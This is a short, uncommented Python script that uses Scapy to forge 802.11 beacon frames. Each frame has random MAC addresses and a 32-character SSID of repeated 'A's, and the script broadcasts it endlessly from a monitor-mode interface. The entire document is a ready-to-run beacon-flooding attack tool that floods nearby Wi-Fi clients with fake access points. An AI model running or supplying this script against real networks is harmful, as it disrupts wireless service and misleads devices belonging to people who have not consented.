#!/usr/bin/env python

from scapy.all import *
beacon=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID", len=32,info="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
conf.iface="mon0"
sendp(beacon,inter=0.5,loop=1)